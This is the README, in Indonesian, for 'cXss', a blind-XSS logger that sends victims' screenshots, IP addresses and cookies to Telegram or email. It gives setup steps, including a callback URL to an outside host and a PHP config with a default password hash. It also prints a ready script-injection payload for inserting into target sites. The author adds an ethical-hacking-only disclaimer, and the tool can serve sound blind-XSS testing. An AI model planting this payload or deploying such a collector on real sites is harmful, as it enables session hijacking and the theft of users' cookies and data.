# cXss
Capture XSS

## ScreenShot
![Alt text](https://raw.githubusercontent.com/vsec7/cXss/master/screenshot/1.png "screenshot")
![Alt text](https://raw.githubusercontent.com/vsec7/cXss/master/screenshot/2.png "screenshot")

#### Created By : Versailles ~ Sec7or Team

cXss adalah Capture XSS / CansXSS :p digunakan untuk Testing Blind XSS.

*Untuk yang ingin membuat logger XSS sendiri seperti xsshunter.*

### FEATURES
	- Mengirim Notifikasi ke Telegram dan Email
	- cXss men-capture beberapa data korban yg Ter-Trigger XSS diantara nya :
		- Screenshoot
		- Victim IP address
		- Victim Cookies
		- dll

### INSTALLATION
git clone / upload repo ini di web server anda

#### Edit File index.js , ganti cans.evils.in dengan domain anda
```
    var url = "http://cans.evils.in/callback";
```

#### Edit file inc/conf.php dengan konfigurasi anda
```
<?php
include("function.php");

// Configurations

// jsonstore.io
$db = ""; 

// Password For Login
$pass = "a820fa8139a40b4590608dd738348d0a"; // default md5 pass : cans , Empty this field if not used

// Set Your Telegram Bot Token & Telegram Recipient ID
$token = ""; // Empty this field if not used
$idRecipient = ""; // Empty this field if not used

// Set Your Email Address
$email = ""; // Empty this field if not used

// -----------------------------------------------------------------------------------------------
$warna = rand_color(); // you can set rand_color() OR which one "primary","success","danger","warning","secondary"

```

### HOW TO USE ?
Sisipkan salah satu payload xss di web target .

```
"><script src=http://yourdomain></script>
```
#### To See Result :
**yourdomain.com/cans/**

## PERHATIAN !
*Hanya untuk pembelajaran dan kegiatan **Ethical Hacking**, Hal negatif yang anda perbuat dengan tool ini diluar tanggung jawab author*

Demo : **http://cans.evils.in**

Donation Paypal : vsec48@gmail.com :v

Thanks :) I miss You Cans .. :)
